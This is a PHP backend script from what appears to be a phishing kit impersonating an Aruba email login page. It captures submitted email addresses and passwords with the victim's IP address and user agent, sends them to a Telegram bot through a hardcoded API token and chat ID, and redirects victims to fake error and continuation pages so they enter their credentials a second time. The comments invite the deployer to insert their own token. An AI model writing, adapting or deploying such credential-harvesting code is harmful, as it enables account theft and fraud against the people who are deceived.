<?php
require 'email.php';
function getIp()
{
	if (isset($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
	else if (isset($_SERVER['HTTP_X_REAL_IP'])) $ip = $_SERVER['HTTP_X_REAL_IP'];
	else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
	else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ip = $_SERVER['HTTP_X_FORWARDED'];
	else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
	else if (isset($_SERVER['HTTP_FORWARDED'])) $ip = $_SERVER['HTTP_FORWARDED'];
	else if (isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
	else $ip = false;
	if ($ip == "::1") {
		return "127.0.0.1";
	}
	return $ip;
}


if (isset($_POST['UserName'])) {

	$action = $_POST['action'];
	$user = $_POST['UserName'];

	if (!empty($usern)) {
		header('Location: ./web/authen.php');
	}

	$user = $_POST['UserName'];
	$pattern = "/@/i";
	$stat = preg_match($pattern, $user);

	if ($stat == 3) {
		$encodedEmail = urlencode($user);
		header("Location: ./web/authen.php?error=3#{$encodedEmail}");
		die();
	}
	if ($action == 3) {
		$ip = GetIP();
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$message = "";
	$message .= "|-----Aruba Email -----|\n";
		$message .= "Email: " . $_POST['UserName'] . "\n";
		$message .= "Password: " . $_POST['Password'] . "\n";
		$message .= "|Client IP: " . $ip . "\n";
		$message .= "User Agent : " . $useragent . "\n";
		$apiToken = "5813960744:AAFslOadZ_mCJ_-mZaNxByyEcjSoQFVQuvk";      // Place your API Token between ""; //
		$data = [
			'chat_id' => '-1003213595173',     // Place your chat ID between ''; //
			'text' => "$message"
		];
		$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
		$encodedEmail = urlencode($user);
		header("Location: ./web/authen.php?error=3#{$encodedEmail}");
	} else if ($action == 4) {
		$ip = GetIP();
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$message = "";
	$message .= "|-----Aruba Email 2 -----|\n";
		$message .= "Email: " . $_POST['UserName'] . "\n";
		$message .= "Password: " . $_POST['Password'] . "\n";
		$message .= "|Client IP: " . $ip . "\n";
		$message .= "User Agent : " . $useragent . "\n";
		$apiToken = "5813960744:AAFslOadZ_mCJ_-mZaNxByyEcjSoQFVQuvk";      // Place your API Token between ""; //
		$data = [
			'chat_id' => '-1003213595173',     // Place your chat ID between ''; //
			'text' => "$message"
		];
		$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
		header('Location: ./web/com.php');
	}
}

